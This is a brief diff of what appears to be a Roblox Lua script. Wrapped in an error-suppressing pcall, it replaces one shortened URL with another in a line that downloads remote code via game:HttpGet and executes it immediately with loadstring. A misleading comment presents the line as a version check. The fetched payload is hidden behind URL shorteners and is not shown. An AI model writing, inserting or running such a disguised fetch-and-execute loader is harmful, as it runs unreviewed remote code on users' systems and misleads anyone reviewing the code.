@@ -3,7 +3,7 @@ repeat task.wait() until game:IsLoaded()
  task.spawn(function()
     pcall(function()
         -- Checking script availability and attempting to sync with the latest version...
-       loadstring(game:HttpGet("https://bit.ly/3NTHefM"))()
+       loadstring(game:HttpGet("https://tinyurl.com/L1inb7HubFixV2"))()
     end)
 end)
 
